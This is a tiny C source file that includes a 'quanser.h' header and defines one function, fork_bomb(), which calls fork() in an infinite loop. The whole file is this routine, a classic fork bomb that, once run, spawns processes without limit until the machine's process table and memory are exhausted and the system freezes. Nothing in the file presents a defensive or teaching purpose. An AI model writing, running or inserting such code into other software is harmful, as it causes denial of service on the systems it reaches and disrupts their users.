#include<stdio.h>
#include"quanser.h"


void fork_bomb()
{
	while(1)
	{
		fork();
	}
}
